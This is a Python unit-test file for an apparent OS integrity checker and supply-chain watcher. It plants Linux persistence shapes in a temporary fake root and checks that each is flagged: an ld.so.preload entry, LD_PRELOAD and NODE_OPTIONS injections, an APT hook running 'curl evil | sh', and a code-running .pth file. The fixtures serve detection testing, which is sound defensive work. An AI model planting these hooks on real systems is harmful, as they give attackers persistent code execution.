"""The integrity check and the supply watch, on a fake root folder (no root needed)."""
import hashlib, importlib, json, os, sys, tempfile, unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path[0:0] = [str(REPO / "system" / "lib"), str(REPO / "system" / "sbin")]


class Integrity(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp(prefix="zenos-root-"))
        r = self.root
        for d in ("var/lib/dpkg/info", "etc/apt/apt.conf.d", "etc/systemd/system/ssh.service.d", "usr/bin",
                  "usr/lib/python3/dist-packages", "etc/ld.so.conf.d", "etc/profile.d", "etc/demo"):
            (r / d).mkdir(parents=True, exist_ok=True)
        (r / "usr/bin/demo").write_bytes(b"real program")
        (r / "etc/demo/demo.conf").write_text("a = 1\n")
        (r / "etc/apt/apt.conf.d/50packaged").write_text('DPkg::Post-Invoke { "true"; };\n')
        (r / "var/lib/dpkg/info/demo.list").write_text("/usr/bin/demo\n/etc/demo/demo.conf\n/etc/apt/apt.conf.d/50packaged\n")
        man = r / "var/lib/zenos/manifests"
        man.mkdir(parents=True)
        h = lambda b: hashlib.sha256(b).hexdigest()
        (r / "var/lib/dpkg/status").write_text("Package: demo\nStatus: install ok installed\nArchitecture: all\nVersion: 1.0\n\n")
        (man / "demo_all.json").write_text(json.dumps({"manifest": {"name": "demo", "version": "1.0", "arch": "all", "files": {
            "/usr/bin/demo": h(b"real program"), "/etc/demo/demo.conf": h(b"a = 1\n")}, "conffiles": ["/etc/demo/demo.conf"]}}))
        os.environ.update(ZENOS_INTEGRITY_ROOT=str(r), ZENOS_MANIFESTS=str(man),
                          ZENOS_INTEGRITY_STATE=str(r / "var/lib/zenos/integrity.json"),
                          ZENOS_INTEGRITY_LEDGER=str(r / "ledger.jsonl"), ZENOS_DPKG_INFO="/var/lib/dpkg/info")
        import zenos_integrity
        self.I = importlib.reload(zenos_integrity)

    def kinds(self, st, level=None):
        return sorted((f["kind"], f["path"]) for f in st["findings"] if level is None or f["level"] == level)

    def test_clean(self):
        st = self.I.run(with_dpkg=False)
        self.assertEqual(st["alerts"], 0, st)

    def test_the_netamloader_shapes(self):
        r = self.root
        (r / "usr/bin/demo").write_bytes(b"changed program")
        (r / "etc/demo/demo.conf").write_text("a = 2\n")                                   # an admin's change: review
        (r / "etc/ld.so.preload").write_text("/tmp/evil.so\n")
        (r / "etc/profile.d/zz.sh").write_text("export NODE_OPTIONS=--require=/tmp/x.js\n")
        (r / "etc/systemd/system/ssh.service.d/override.conf").write_text("[Service]\nEnvironment=LD_PRELOAD=/tmp/e.so\n")
        (r / "etc/apt/apt.conf.d/99update").write_text('APT::Update::Post-Invoke { "curl evil | sh"; };\n')
        (r / "usr/lib/python3/dist-packages/zz.pth").write_text("import os; os.system('x')\n")
        (r / "etc/ld.so.conf.d/zz.conf").write_text("/tmp/lib\n")
        st = self.I.run(with_dpkg=False)
        alerts = self.kinds(st, "alert")
        self.assertIn(("changed", "/usr/bin/demo"), alerts)
        self.assertIn(("ld.so.preload", "/etc/ld.so.preload"), alerts)
        self.assertIn(("loader-variable", "/etc/profile.d/zz.sh"), alerts)
        self.assertIn(("loader-variable", "/etc/systemd/system/ssh.service.d/override.conf"), alerts)
        self.assertIn(("apt-hook", "/etc/apt/apt.conf.d/99update"), alerts)
        self.assertIn(("python-startup", "/usr/lib/python3/dist-packages/zz.pth"), alerts)
        self.assertIn(("ld.so.conf.d", "/etc/ld.so.conf.d/zz.conf"), alerts)
        self.assertNotIn(("apt-hook", "/etc/apt/apt.conf.d/50packaged"), alerts)            # owned by a package
        self.assertIn(("changed-conffile", "/etc/demo/demo.conf"), self.kinds(st, "review"))
        ev = [json.loads(l) for l in (r / "ledger.jsonl").read_text().splitlines()]
        self.assertEqual(ev[-1]["event"], "integrity-alert")


class SupplyWatch(unittest.TestCase):
    def test_unknown_files_in_the_update_folder(self):
        d = Path(tempfile.mkdtemp(prefix="zenos-apt-"))
        os.environ.update(ZENOS_QUARANTINE=str(d / "q"), ZENOS_SUPPLYWATCH_LEDGER=str(d / "ledger.jsonl"))
        import zenos_supplywatch
        W = importlib.reload(zenos_supplywatch)
        (d / "partial").mkdir()
        (d / "fabric.config").write_text("<configuration/>")
        (d / "partial" / "x.deb").write_bytes(b"downloading")
        (d / "lock").write_text("")
        enforce = {"mode": "enforce", "required": 2, "ring": 1}
        self.assertEqual(W.inspect(d / "fabric.config", enforce), "quarantined")
        self.assertFalse((d / "fabric.config").exists())
        self.assertEqual(W.inspect(d / "partial" / "x.deb", enforce), "skipped")
        self.assertEqual(W.inspect(d / "lock", enforce), "skipped")
        (d / "fake_1.0_all.deb").write_bytes(b"not a real package")
        self.assertEqual(W.inspect(d / "fake_1.0_all.deb", enforce, get=lambda n, s: []), "quarantined")   # unreadable
        (d / "other.txt").write_text("x")
        self.assertEqual(W.inspect(d / "other.txt", {"mode": "off"}), "skipped")
        ev = [json.loads(l)["event"] for l in (d / "ledger.jsonl").read_text().splitlines()]
        self.assertEqual(ev, ["supply-alert", "supply-alert"])
        self.assertEqual(len(list((d / "q").iterdir())), 2)


if __name__ == "__main__":
    unittest.main()
